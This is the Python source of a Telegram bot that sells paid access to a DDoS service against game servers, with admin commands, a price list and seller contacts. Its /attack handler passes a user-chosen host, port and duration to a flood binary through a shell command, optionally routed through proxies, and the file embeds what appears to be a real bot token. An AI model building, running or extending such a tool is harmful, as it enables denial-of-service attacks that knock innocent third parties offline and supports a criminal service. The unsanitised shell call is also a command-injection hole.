import telebot
import subprocess
import requests
import datetime
import os
import random

# insert your Telegram bot token here
bot = telebot.TeleBot('7406420865:AAHkSrJwx_aA_r3Lk7JOQoJ7wQuoXpkRZu8')

# Admin user IDs
admin_id = ["1246758560"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store proxy list
PROXY_FILE = "n.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["1246758560"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "𝐋𝐨𝐠𝐬 𝐀𝐫𝐞 𝐂𝐥𝐞𝐚𝐫𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐍𝐨 𝐃𝐚𝐭𝐚 𝐅𝐨𝐮𝐧𝐝"
            else:
                file.truncate(0)
                response = "𝐋𝐨𝐠𝐬 𝐂𝐥𝐞𝐚𝐫𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲"
    except FileNotFoundError:
        response = "𝐍𝐨 𝐋𝐨𝐠𝐬 𝐅𝐨𝐮𝐧𝐝 𝐓𝐨 𝐂𝐥𝐞𝐚𝐫"
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐟𝐨𝐫𝐦𝐚𝐭. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐩𝐨𝐬𝐢𝐭𝐢𝐯𝐞 𝐢𝐧𝐭𝐞𝐠𝐞𝐫 𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐝 𝐛𝐲 '𝐡𝐨𝐮𝐫(𝐬)', '𝐝𝐚𝐲(𝐬)', '𝐰𝐞𝐞𝐤(𝐬)', 𝐨𝐫 '𝐦𝐨𝐧𝐭𝐡(𝐬)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"𝐔𝐬𝐞𝐫 {user_to_add} 𝐀𝐝𝐝𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐅𝐨𝐫 {duration} {time_unit} 𝐀𝐜𝐜𝐞𝐬𝐬 𝐖𝐢𝐥𝐥 𝐄𝐱𝐩𝐢𝐫𝐞 𝐎𝐧 {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐬𝐞𝐭 𝐚𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐞𝐱𝐩𝐢𝐫𝐲 𝐝𝐚𝐭𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐭𝐫𝐲 𝐚𝐠𝐚𝐢𝐧 𝐥𝐚𝐭𝐞𝐫."
            else:
                response = "𝐔𝐬𝐞𝐫 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐄𝐱𝐢𝐬𝐭𝐬"
        else:
            response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐩𝐞𝐜𝐢𝐟𝐲 𝐚 𝐮𝐬𝐞𝐫 𝐈𝐃 𝐚𝐧𝐝 𝐭𝐡𝐞 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 (𝐞.𝐠., 𝟏𝐡𝐨𝐮𝐫, 𝟐𝐝𝐚𝐲𝐬, 𝟑𝐰𝐞𝐞𝐤𝐬) 𝐭𝐨 𝐚𝐝𝐝"
    else:
        response = "𝐎𝐧𝐥𝐲 𝐎𝐰𝐧𝐞𝐫 𝐎𝐟 𝐁𝐨𝐭 𝐂𝐚𝐧 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝"

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"𝐘𝐨𝐮𝐫 𝐈𝐧𝐟𝐨:\n\n𝐔𝐬𝐞𝐫 𝐈𝐝: <code>{user_id}</code>\n𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: {username}\n𝐑𝐨𝐥𝐞: {user_role}\n𝐀𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐄𝐱𝐩𝐢𝐫𝐲 𝐃𝐚𝐭𝐞: {user_approval_expiry.get(user_id, '𝐍𝐨𝐭 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝')}\n𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐀𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐓𝐢𝐦𝐞: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝐘𝐨𝐮𝐫 𝐢𝐝: {user_id}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝐔𝐬𝐞𝐫 {user_to_remove} 𝐫𝐞𝐦𝐨𝐯𝐞𝐝 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲"
            else:
                response = f"𝐔𝐬𝐞𝐫 {user_to_remove} 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐭𝐡𝐞 𝐥𝐢𝐬𝐭"
        else:
            response = '''𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐩𝐞𝐜𝐢𝐟𝐲 𝐀 𝐔𝐬𝐞𝐫 𝐈𝐃 𝐭𝐨 𝐑𝐞𝐦𝐨𝐯𝐞. 
𝐔𝐬𝐚𝐠𝐞: /remove <𝐮𝐬𝐞𝐫𝐢𝐝>'''
    else:
        response = "𝐎𝐧𝐥𝐲 𝐎𝐰𝐧𝐞𝐫 𝐎𝐟 𝐁𝐨𝐭 𝐂𝐚𝐧 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝"

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝐋𝐨𝐠𝐬 𝐚𝐫𝐞 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐜𝐥𝐞𝐚𝐫𝐞𝐝. 𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝"
                else:
                    file.truncate(0)
                    response = "𝐋𝐨𝐠𝐬 𝐂𝐥𝐞𝐚𝐫𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲"
        except FileNotFoundError:
            response = "𝐋𝐨𝐠𝐬 𝐚𝐫𝐞 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐜𝐥𝐞𝐚𝐫𝐞𝐝"
    else:
        response = ""
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝐔𝐒𝐄𝐑𝐒 𝐚𝐫𝐞 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐜𝐥𝐞𝐚𝐫𝐞𝐝. 𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝"
                else:
                    file.truncate(0)
                    response = "𝐮𝐬𝐞𝐫𝐬 𝐂𝐥𝐞𝐚𝐫𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲"
        except FileNotFoundError:
            response = "𝐔𝐒𝐄𝐑𝐒 𝐚𝐫𝐞 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐜𝐥𝐞𝐚𝐫𝐞𝐝"
    else:
        response = "𝐎𝐧𝐥𝐲 𝐎𝐰𝐧𝐞𝐫 𝐎𝐟 𝐁𝐨𝐭 𝐂𝐚𝐧 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝"
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐔𝐬𝐞𝐫𝐬:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- 𝐔𝐬𝐞𝐫 𝐢𝐝: {user_id}\n"
                else:
                    response = "𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝"
        except FileNotFoundError:
            response = "𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝"
    else:
        response = "𝐎𝐧𝐥𝐲 𝐎𝐰𝐧𝐞𝐫 𝐎𝐟 𝐁𝐨𝐭 𝐂𝐚𝐧 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝"
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝"
                bot.reply_to(message, response)
        else:
            response = "𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝"
            bot.reply_to(message, response)
    else:
        response = "𝐎𝐧𝐥𝐲 𝐎𝐰𝐧𝐞𝐫 𝐎𝐟 𝐁𝐨𝐭 𝐂𝐚𝐧 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝"
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username},🚀 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n🎯 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔗 𝐏𝐨𝐫𝐭: {port}\n ⏳𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n⚙️ 𝐌𝐞𝐭𝐡𝐨𝐝: 𝐃𝐃𝐨𝐒𝐒𝐞𝐑"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =30

# Function to read proxies from file
def read_proxies():
    try:
        with open(PROXY_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to get a random proxy
def get_random_proxy():
    proxies = read_proxies()
    if proxies:
        return random.choice(proxies)
    return None

# Handler for /bgmi command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝐘𝐨𝐮 𝐚𝐫𝐞 𝐨𝐧 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧.\n𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝟑𝟎 𝐒𝐞𝐜𝐨𝐧𝐝 𝐛𝐞𝐟𝐨𝐫𝐞 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐭𝐡𝐞 /attack 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐚𝐠𝐚𝐢𝐧"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 1000:
                response = "𝐄𝐫𝐫𝐨𝐫: 𝐓𝐢𝐦𝐞 𝐢𝐧𝐭𝐞𝐫𝐯𝐚𝐥 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐥𝐞𝐬𝐬 𝐭𝐡𝐚𝐧 𝟏𝟎𝟎𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
            else:
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                
                # Use a proxy if available
                proxy = get_random_proxy()
                if proxy:
                    full_command = f"proxychains4 -q ./bgmi {target} {port} {time} 500"
                    os.environ['PROXYCHAINS_PROXY'] = proxy
                else:
                    full_command = f"./bgmi {target} {port} {time} 500"

                subprocess.run(full_command, shell=True)
                response = f"𝐁𝐆𝐌𝐈 𝐀𝐭𝐭𝐚𝐜𝐤 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝.\n🎯 𝐇𝐨𝐬𝐭: {target}\n🔗 𝐏𝐨𝐫𝐭: {port}\n⏳ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
        else:
            response = "𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐅𝐨𝐫𝐦𝐚𝐭 ⚠️.\n𝐔𝐬𝐚𝐠𝐞 ✅:- /attack <𝐡𝐨𝐬𝐭> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞>"  # Updated command syntax
    else:
        response = "𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "𝐍𝐨 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐋𝐨𝐠𝐬 𝐅𝐨𝐮𝐧𝐝 𝐅𝐨𝐫 𝐘𝐨𝐮"
        except FileNotFoundError:
            response = "𝐍𝐨 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐋𝐨𝐠𝐬 𝐅𝐨𝐮𝐧𝐝"
    else:
        response = "𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬:
🚀 /attack : 𝐃𝐃𝐨𝐒𝐒𝐞𝐑. 
🚦 /rules : 𝐀𝐯𝐨𝐢𝐝 𝐓𝐡𝐞𝐬𝐞 𝐑𝐮𝐥𝐞𝐬.
🧾 /mylogs : 𝐘𝐨𝐮𝐫 𝐀𝐭𝐭𝐚𝐜𝐤𝐬.
💶 /plan : 𝐃𝐃𝐨𝐒𝐒𝐞𝐑 𝐏𝐥𝐚𝐧𝐬.
👨‍🏫 /myinfo : 𝐘𝐨𝐮𝐫 𝐈𝐧𝐟𝐨.
🆔 /id : 𝐘𝐨𝐮𝐫 𝐈𝐝.
    
𝐓𝐨 𝐒𝐞𝐞 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:
💎 /admin : 𝐒𝐡𝐨𝐰𝐬 𝐀𝐥𝐥 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬.

💱𝐁𝐮𝐲 𝐅𝐫𝐨𝐦 :- @noobcheats_owner
🏫𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 :- http://t.me/noobcheatsofficial
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''💐𝐖𝐞𝐥𝐜𝐨𝐦𝐞 {𝐮𝐬𝐞𝐫_𝐧𝐚𝐦𝐞} 𝐓𝐨 𝐎𝐮𝐫 𝐁𝐨𝐭\n🥶 𝐓𝐡𝐞 𝐃𝐃𝐨𝐒𝐒𝐞𝐑 𝐅𝐞𝐞𝐥 𝐅𝐫𝐞𝐞 𝐓𝐨 𝐄𝐱𝐩𝐥𝐨𝐫𝐞\n𝐅𝐨𝐫 𝐌𝐨𝐫𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 𝐓𝐫𝐲 𝐓𝐨 𝐑𝐮𝐧 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 : /help\n
💱 𝐁𝐮𝐲 𝐀𝐜𝐜𝐞𝐬𝐬 𝐅𝐫𝐨𝐦 @noobcheats_owner'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝐏𝐥𝐞𝐚𝐬𝐞 𝐅𝐨𝐥𝐥𝐨𝐰 𝐓𝐡𝐞𝐬𝐞 𝐑𝐮𝐥𝐞𝐬 :
𝟏. 𝐃𝐨𝐧𝐭 𝐑𝐮𝐧 𝐓𝐨𝐨 𝐌𝐚𝐧𝐲 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 !! 𝐂𝐚𝐮𝐬𝐞 𝐀 𝐁𝐚𝐧 𝐅𝐫𝐨𝐦 𝐁𝐨𝐭
𝟐. 𝐃𝐨𝐧𝐭 𝐑𝐮𝐧 𝟐 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 𝐀𝐭 𝐒𝐚𝐦𝐞 𝐓𝐢𝐦𝐞 𝐁𝐞𝐜𝐳 𝐈𝐟 𝐔 𝐓𝐡𝐞𝐧 𝐔 𝐆𝐨𝐭 𝐁𝐚𝐧𝐧𝐞𝐝 𝐅𝐫𝐨𝐦 𝐁𝐨𝐭.
𝟑. 𝐌𝐚𝐤𝐞 𝐒𝐮𝐫𝐞 𝐘𝐨𝐮 𝐉𝐨𝐢𝐧𝐞𝐝 @𝐧𝐨𝐨𝐛𝐜𝐡𝐞𝐚𝐭𝐬𝐨𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐎𝐭𝐡𝐞𝐫𝐰𝐢𝐬𝐞 𝐓𝐡𝐞 𝐃𝐃𝐨𝐒 𝐖𝐢𝐥𝐥 𝐍𝐨𝐭 𝐖𝐨𝐫𝐤.
𝟒. 𝐖𝐞 𝐃𝐚𝐢𝐥𝐲 𝐂𝐡𝐞𝐜𝐤𝐬 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐒𝐨 𝐅𝐨𝐥𝐥𝐨𝐰 𝐭𝐡𝐞𝐬𝐞 𝐫𝐮𝐥𝐞𝐬 𝐭𝐨 𝐚𝐯𝐨𝐢𝐝 𝐁𝐚𝐧!!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐖𝐞 𝐇𝐚𝐯𝐞 𝐎𝐧𝐥𝐲 𝟏 𝐏𝐥𝐚𝐧 𝐀𝐧𝐝 𝐓𝐡𝐚𝐭 𝐈𝐬 𝐏𝐨𝐰𝐞𝐫𝐟𝐮𝐥𝐥 𝐓𝐡𝐞𝐧 𝐀𝐧𝐲 𝐎𝐭𝐡𝐞𝐫 𝐃𝐃𝐨𝐒 𝐓𝐡𝐚𝐭 𝐈𝐬 𝐃𝐃𝐨𝐒𝐒𝐞𝐑 !!!:

🚀 𝐃𝐃𝐨𝐒𝐒𝐞𝐑 :
-> 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐢𝐦𝐞 : 𝟏𝟎𝟎𝟎 (𝐒)
> 𝐀𝐟𝐭𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 𝐋𝐢𝐦𝐢𝐭 : 𝟑𝟎 𝐬𝐞𝐜
-> 𝐂𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭𝐬 𝐀𝐭𝐭𝐚𝐜𝐤 : 𝟓𝟎𝟎

💲 𝐏𝐫𝐢𝐜𝐞 𝐋𝐢𝐬𝐭 :
𝐃𝐚𝐲-->𝟓𝟎 𝐑𝐬
𝐖𝐞𝐞𝐤-->𝟏𝟎𝟎 𝐑𝐬
𝐌𝐨𝐧𝐭𝐡-->𝟐𝟎𝟎 𝐑𝐬
𝐒𝐞𝐚𝐬𝐨𝐧-->𝟑𝟎𝟎 𝐑𝐬
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admin'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 𝐀𝐫𝐞 𝐇𝐞𝐫𝐞!!:
    
➕🧒/add <𝐮𝐬𝐞𝐫𝐈𝐝> <𝐭𝐢𝐦𝐞>: 𝐀𝐝𝐝 𝐚 𝐔𝐬𝐞𝐫.
➖🧒/remove <𝐮𝐬𝐞𝐫𝐢𝐝> 𝐑𝐞𝐦𝐨𝐯𝐞 𝐚 𝐔𝐬𝐞𝐫
🤑🧒/allusers : 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐬𝐞𝐝 𝐔𝐬𝐞𝐫𝐬 𝐋𝐢𝐬𝐭𝐬.
🧾🚀/logs : 𝐀𝐥𝐥 𝐔𝐬𝐞𝐫𝐬 𝐋𝐨𝐠𝐬.
💬💎/broadcast : 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐚 𝐌𝐞𝐬𝐬𝐚𝐠𝐞.
➖🧾/clearlogs : 𝐂𝐥𝐞𝐚𝐫 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐅𝐢𝐥𝐞.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐓𝐨 𝐀𝐥𝐥 𝐔𝐬𝐞𝐫𝐬 𝐁𝐲 𝐀𝐝𝐦𝐢𝐧:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐬𝐞𝐧𝐝 𝐛𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐭𝐨 𝐮𝐬𝐞𝐫 {user_id}: {str(e)}")
            response = "𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐒𝐞𝐧𝐭 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐓𝐨 𝐀𝐥𝐥 𝐔𝐬𝐞𝐫𝐬"
        else:
            response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 𝐀 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐓𝐨 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭."
    else:
        response = "𝐎𝐧𝐥𝐲 𝐀𝐝𝐦𝐢𝐧 𝐂𝐚𝐧 𝐑𝐮𝐧 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝"

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


